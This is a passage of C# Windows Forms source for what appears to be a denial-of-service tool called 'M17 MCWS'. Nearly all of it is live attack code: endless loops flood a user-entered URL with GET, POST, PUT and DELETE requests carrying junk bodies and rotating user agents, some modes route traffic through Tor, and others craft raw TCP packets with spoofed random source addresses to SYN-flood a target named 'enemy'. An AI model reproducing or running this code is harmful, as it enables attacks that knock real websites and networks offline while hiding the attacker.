                                {
                                    var ch = new ClearanceHandler();
                                    HttpClient hc = new HttpClient(ch);
                                    HttpClientHandler hch = new HttpClientHandler();
                                    hch.UseProxy = true;
                                    hch.Proxy = new WebProxy();
                                    while (GET.Checked)
                                    {
                                        hc.GetAsync(textBox1.Text);
                                    }
                                    while (POST.Checked)
                                    {
                                        hc.PostAsync(textBox1.Text, new StringContent("VNDFPGJSHOKKSJGJIÉSF=BNSDHGFghdhgggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggjgbsjdkjvbsdjbsůkbvknksjůbkůscjbvkjscjbsbjvjsvjbsdbvsifdsaighjgjhghfjghfjfjnghnrfjfdjnghedjfhgjejgvbfjwkgjdodjhghdkghfdkghdkgjdhfjuVNDFPGJSHOKKSJGJIÉSF=BNSDHGFghdhggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggg"));
                                    }
                                    while (DELETE.Checked)
                                    {
                                        hc.DeleteAsync(textBox1.Text);
                                    }
                                    while (PUT.Checked)
                                    {
                                        hc.PutAsync(textBox1.Text, new StringContent("VNDFPGJSHOKKSJGJIÉSF=BNSDHGFghdhgggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggjgbsjdkjvbsdjbsůkbvknksjůbkůscjbvkjscjbsbjvjsvjbsdbvsifdsaighjgjhghfjghfjfjnghnrfjfdjnghedjfhgjejgvbfjwkgjdodjhghdkghfdkghdkgjdhfjuVNDFPGJSHOKKSJGJIÉSF=BNSDHGFghdhggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggg"));
                                    }
                                }
                                break;
                            case 2:
                                Process proc = new Process();
                                ProcessStartInfo psi = proc.StartInfo;
                                psi.FileName = @"M15_L7.py";
                                psi.Arguments = $"--url {textBox1.Text} --method 2 --get {fupc(GET.Checked)} --proxy {textBox2.Text} --up {fupc(checkBox1.Checked)} --post {fupc(POST.Checked)} --put {fupc(PUT.Checked)} --head {fupc(HEAD.Checked)} --delete {fupc(DELETE.Checked)} --options {fupc(OPTIONS.Checked)}";
                                break;
                            case 3:
                                Process proc2 = new Process();
                                ProcessStartInfo psi2 = proc2.StartInfo;
                                psi2.FileName = @"M15_L7.py";
                                psi2.Arguments = $"--url {textBox1.Text} --method 3 --get {fupc(GET.Checked)} --proxy {textBox2.Text} --up {fupc(checkBox1.Checked)} --post {fupc(POST.Checked)} --put {fupc(PUT.Checked)} --head {fupc(HEAD.Checked)} --delete {fupc(DELETE.Checked)} --options {fupc(OPTIONS.Checked)}";
                                break;
                            case 4:
                                if (checkBox1.Checked)
                                {
                                    HttpClientHandler hch = new HttpClientHandler();
                                    HttpClient hc = new HttpClient(hch);
                                    hch.Proxy = new WebProxy(textBox2.Text);
                                    while (GET.Checked)
                                    {

                                        int index = r.Next(0, uas.Length);
                                        hc.DefaultRequestHeaders.UserAgent.ParseAdd(uas[index]);
                                        hc.GetAsync(textBox1.Text);
                                    }
                                    while (POST.Checked)
                                    {

                                        int index = r.Next(0, uas.Length);
                                        hc.DefaultRequestHeaders.UserAgent.ParseAdd(uas[index]);
                                        hc.PostAsync(textBox1.Text, new StringContent("VNDFPGJSHOKKSJGJIÉSF=BNSDHGFghdhgggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggjgbsjdkjvbsdjbsůkbvknksjůbkůscjbvkjscjbsbjvjsvjbsdbvsifdsaighjgjhghfjghfjfjnghnrfjfdjnghedjfhgjejgvbfjwkgjdodjhghdkghfdkghdkgjdhfjuVNDFPGJSHOKKSJGJIÉSF=BNSDHGFghdhggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggg"));
                                    }
                                    while (DELETE.Checked)
                                    {

                                        int index = r.Next(0, uas.Length);
                                        hc.DefaultRequestHeaders.UserAgent.ParseAdd(uas[index]);
                                        hc.DeleteAsync(textBox1.Text);
                                    }
                                    while (PUT.Checked)
                                    {

                                        int index = r.Next(0, uas.Length);
                                        hc.DefaultRequestHeaders.UserAgent.ParseAdd(uas[index]);
                                        hc.PutAsync(textBox1.Text, new StringContent("VNDFPGJSHOKKSJGJIÉSF=BNSDHGFghdhgggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggjgbsjdkjvbsdjbsůkbvknksjůbkůscjbvkjscjbsbjvjsvjbsdbvsifdsaighjgjhghfjghfjfjnghnrfjfdjnghedjfhgjejgvbfjwkgjdodjhghdkghfdkghdkgjdhfjuVNDFPGJSHOKKSJGJIÉSF=BNSDHGFghdhggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggg"));
                                    }
                                }
                                else
                                {
                                    HttpClientHandler hch = new HttpClientHandler();
                                    HttpClient hc = new HttpClient(hch);
                                    hch.Proxy = new WebProxy(textBox2.Text);
                                    for (int x = 0; x < trackBar1.Value; x++)
                                    {
                                        while (GET.Checked)
                                        {

                                            int index = r.Next(0, uas.Length);
                                            hc.DefaultRequestHeaders.UserAgent.ParseAdd(uas[index]);
                                            hc.GetAsync(textBox1.Text);
                                        }
                                        while (POST.Checked)
                                        {

                                            int index = r.Next(0, uas.Length);
                                            hc.DefaultRequestHeaders.UserAgent.ParseAdd(uas[index]);
                                            hc.PostAsync(textBox1.Text, new StringContent("VNDFPGJSHOKKSJGJIÉSF=BNSDHGFghdhgggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggjgbsjdkjvbsdjbsůkbvknksjůbkůscjbvkjscjbsbjvjsvjbsdbvsifdsaighjgjhghfjghfjfjnghnrfjfdjnghedjfhgjejgvbfjwkgjdodjhghdkghfdkghdkgjdhfjuVNDFPGJSHOKKSJGJIÉSF=BNSDHGFghdhggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggg"));
                                        }
                                        while (DELETE.Checked)
                                        {

                                            int index = r.Next(0, uas.Length);
                                            hc.DefaultRequestHeaders.UserAgent.ParseAdd(uas[index]);
                                            hc.DeleteAsync(textBox1.Text);
                                        }
                                        while (PUT.Checked)
                                        {

                                            int index = r.Next(0, uas.Length);
                                            hc.DefaultRequestHeaders.UserAgent.ParseAdd(uas[index]);
                                            hc.PutAsync(textBox1.Text, new StringContent("VNDFPGJSHOKKSJGJIÉSF=BNSDHGFghdhgggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggjgbsjdkjvbsdjbsůkbvknksjůbkůscjbvkjscjbsbjvjsvjbsdbvsifdsaighjgjhghfjghfjfjnghnrfjfdjnghedjfhgjejgvbfjwkgjdodjhghdkghfdkghdkgjdhfjuVNDFPGJSHOKKSJGJIÉSF=BNSDHGFghdhggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggg"));
                                        }
                                    }
                                }
                                break;
                            case 5:
                                HttpClientHandler hch1 = new HttpClientHandler();
                                hch1.UseProxy = true;
                                hch1.Proxy = new WebProxy("socks5://127.0.0.1:9050");
                                HttpContent hco = new ByteArrayContent(Encoding.UTF8.GetBytes(@"E\x00\x00\xc8\x00\x01\x00\x00@\x06\xbf\xae\x01\t\x07\x05\xac\xff\x05t\x00 -\x00K\x00\x00\x00\x00\x00\x00\x00\x00P\x02 \x00Pv\x00\x00\x00 -\x00K\x00\x00\x00\x00\x00\x00\x00\x00P\x02 \x00\x00\x00\x00\x00\x00 -\x00K\x00\x00\x00\x00\x00\x00\x00\x00P\x02 \x00\x00\x00\x00\x00\x00 -\x00K\x00\x00\x00\x00\x00\x00\x00\x00P\x02 \x00\x00\x00\x00\x00\x00 -\x00K\x00\x00\x00\x00\x00\x00\x00\x00P\x02 \x00\x00\x00\x00\x00\x00 -\x00K\x00\x00\x00\x00\x00\x00\x00\x00P\x02 \x00\x00\x00\x00\x00\x00 -\x00K\x00\x00\x00\x00\x00\x00\x00\x00P\x02 \x00\x00\x00\x00\x00\x00 -\x00K\x00\x00\x00\x00\x00\x00\x00\x00P\x02 \x00\x00\x00\x00\x00\x00 -\x00K\x00\x00\x00\x00\x00\x00\x00\x00P\x02 \x00\x00\x00\x00\x00"));
                                HttpClient hc1 = new HttpClient(hch1);
                                HttpRequestMessage hrm = new HttpRequestMessage();
                                hc1.BaseAddress = new Uri(textBox1.Text);
                                hrm.Content = hco;
                                int i = r.Next(0, uas.Length);
                                hc1.DefaultRequestHeaders.UserAgent.ParseAdd(uas[i]);
                                hrm.RequestUri = new Uri(textBox1.Text);
                                while (true)
                                {
                                    await hc1.GetAsync(textBox1.Text);
                                    hc1.DefaultRequestHeaders.UserAgent.ParseAdd(uas[i]);
                                }
                                break;
                            case 6:
                                IPAddress ipa = IPAddress.Parse(textBox1.Text);
                                ushort sport = ushort.Parse(textBox2.Text);
                                ushort dport = 80;
                                IPAddress sp = Dns.GetHostAddresses(textBox1.Text)[0];
                                IPEndPoint ipe = new IPEndPoint(ipa, dport);
                                EthernetPacket ep = new EthernetPacket(admac, PhysicalAddress.Parse("ff:ff:ff:ff:ff:ff"), EthernetType.None);
                                IPv4Packet ip = new IPv4Packet(sp, ipa);
                                IPv6Packet ip6 = new IPv6Packet(sp, ipa);
                                var tcp = new TcpPacket(sport, dport);
                                ushort ttl = 250;
                                ip.PayloadPacket = tcp;
                                tcp.SourcePort = sport;
                                tcp.DestinationPort = dport;
                                var hc3 = new HttpClient();

                                var req = new HttpRequestMessage(HttpMethod.Get, textBox1.Text)
                                {
                                    Version = new Version(2, 0)
                                };
                                if (GET.Checked)
                                {
                                    req.Method = HttpMethod.Get;
                                }
                                if (POST.Checked)
                                {
                                    req.Method = HttpMethod.Post;
                                }
                                if (DELETE.Checked)
                                {
                                    req.Method = HttpMethod.Delete;
                                }
                                if (PUT.Checked)
                                {
                                    req.Method = HttpMethod.Put;
                                }
                                if (TRACE.Checked)
                                {
                                    req.Method = HttpMethod.Trace;
                                }
                                if (PATCH.Checked)
                                {
                                    req.Method = HttpMethod.Patch;
                                }
                                if (OPTIONS.Checked)
                                {
                                    req.Method = HttpMethod.Options;
                                }
                                tcp.Reset = true;
                                while (true)
                                {
                                    await hc3.SendAsync(req);
                                    dev.SendPacket(ep.Bytes);
                                }
                                break;
                            case 7:
                                dev.Open();
                                IPAddress en = Dns.GetHostAddresses(textBox1.Text)[0];
                                IPAddress a = randip();
                                EthernetPacket ep1 = new EthernetPacket(admac, PhysicalAddress.Parse("ff:ff:ff:ff:ff:ff"), EthernetType.None);
                                IPv4Packet ip1 = new IPv4Packet(a, en);
                                TcpPacket t = new TcpPacket(80, 80);
                                t.Synchronize = true;
                                IPv4Packet ip2 = new IPv4Packet(en, a);
                                TcpPacket t1 = new TcpPacket(80, 80);
                                TcpPacket hr = new TcpPacket(80, 80);
                                string method = "";
                                if (GET.Checked)
                                {
                                    method = "GET";
                                }
                                if (POST.Checked)
                                {
                                    method = "POST";
                                }
                                if (DELETE.Checked)
                                {
                                    method = "DELETE";
                                }
                                if (PUT.Checked)
                                {
                                    method = "PUT";
                                }
                                if (TRACE.Checked)
                                {
                                    method = "TRACE";
                                }
                                if (PATCH.Checked)
                                {
                                    method = "PATCH";
                                }
                                if (CONNECT.Checked)
                                {
                                    method = "CONNECT";
                                }
                                if (OPTIONS.Checked)
                                {
                                    method = "OPTIONS";
                                }
                                hr.PayloadData = Encoding.UTF8.GetBytes($@"{method} / HTTP/2\r\nHost: {textBox2.Text}\r\nUserAgent: {uas[new Random().Next(0, uas.Length)]}\r\n\r\n");
                                t1.Synchronize = true;
                                t1.Acknowledgment = true;
                                hr.Acknowledgment = true;
                                for (int x = 0; x < trackBar1.Value; x++)
                                {
                                    while (true)
                                    {
                                        hr.PayloadData = Encoding.UTF8.GetBytes($@"{method} / HTTP/2\r\nHost: {textBox2.Text}\r\nUserAgent: {uas[new Random().Next(0, uas.Length)]}\r\n\r\n");
                                        ip1.PayloadPacket = t;
                                        ep1.PayloadPacket = ip1;
                                        dev.SendPacket(ep1);
                                        ip2.PayloadPacket = t1;
                                        ep1.PayloadPacket = ip2;
                                        dev.SendPacket(ep1);
                                        ip1.PayloadPacket = hr;
                                        ep1.PayloadPacket = ip1;
                                        dev.SendPacket(ep1);
                                        a = randip();
                                    }
                                }
                                break;
                            case 8:
                                dev.Open();
                                IPAddress enemy = Dns.GetHostAddresses(textBox1.Text)[0];
                                IPAddress aa = randip();
                                EthernetPacket ep1a = new EthernetPacket(admac, PhysicalAddress.Parse("ff:ff:ff:ff:ff:ff"), EthernetType.None);
                                IPv4Packet ip1a = new IPv4Packet(aa, enemy);
                                TcpPacket ta = new TcpPacket(80, 80);
                                IPv4Packet ip2a = new IPv4Packet(enemy, aa);
                                ta.Synchronize = true;
                                TcpPacket t1a = new TcpPacket(80, 80);
                                TcpPacket hra = new TcpPacket(80, 80);
                                string methoda = "";
                                if (GET.Checked)
                                {
                                    methoda = "GET";
                                }
                                if (POST.Checked)
                                {
                                    methoda = "POST";
                                }
                                if (DELETE.Checked)
                                {
                                    methoda = "DELETE";
                                }
                                if (PUT.Checked)
                                {
                                    methoda = "PUT";
                                }
                                if (TRACE.Checked)
                                {
                                    methoda = "TRACE";
                                }
                                if (PATCH.Checked)
                                {
                                    methoda = "PATCH";
                                }
                                if (CONNECT.Checked)
                                {
                                    methoda = "CONNECT";
                                }
                                if (OPTIONS.Checked)
                                {
                                    methoda = "OPTIONS";
                                }
                                hra.PayloadData = Encoding.UTF8.GetBytes($@"{methoda} / HTTP/2\r\nHost: {textBox2.Text}\r\n\r\n");
                                t1a.Synchronize = true;
                                t1a.Acknowledgment = true;
                                hra.Acknowledgment = true;
                                for (int x = 0; x < trackBar1.Value; x++)
                                {
                                    while (true)
                                    {
                                        hra.PayloadData = Encoding.UTF8.GetBytes($@"{methoda} / HTTP/2\r\nHost: {textBox2.Text}\r\nUserAgent: {uas[new Random().Next(0, uas.Length)]}\r\n\r\n");
                                        ip1a.PayloadPacket = ta;
                                        ep1a.PayloadPacket = ip1a;
                                        dev.SendPacket(ep1a);
                                        ip2a.PayloadPacket = t1a;
                                        ep1a.PayloadPacket = ip2a;
                                        dev.SendPacket(ep1a);
                                        ip1a.PayloadPacket = hra;
                                        ep1a.PayloadPacket = ip1a;
                                        dev.SendPacket(ep1a);
                                        a = randip();
                                    }
                                }
                                break;
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "M17 MCWS - Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void button3_Click(object sender, EventArgs e)
        {

        }

        private void button2_Click(object sender, EventArgs e)
        {
             Process.Start(@"tor.exe", "--HTTPTunnelPort 9124");
        }

        private void pictureBox3_Click_1(object sender, EventArgs e)
        {
            if (this.WindowState == FormWindowState.Maximized)
            {
                this.WindowState = FormWindowState.Normal;
            }
            else if (this.WindowState == FormWindowState.Normal)
            {
                this.WindowState = FormWindowState.Maximized;
            }
        }
        private void close(object sender, EventArgs e)
        {
            this.Close();
        }
        private void pictureBox4_Click(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Minimized;
        }

        private void comboBox3_SelectedIndexChanged(object sender, EventArgs e)
        {
            dev = cdl[comboBox3.SelectedIndex];
        }
    }
}
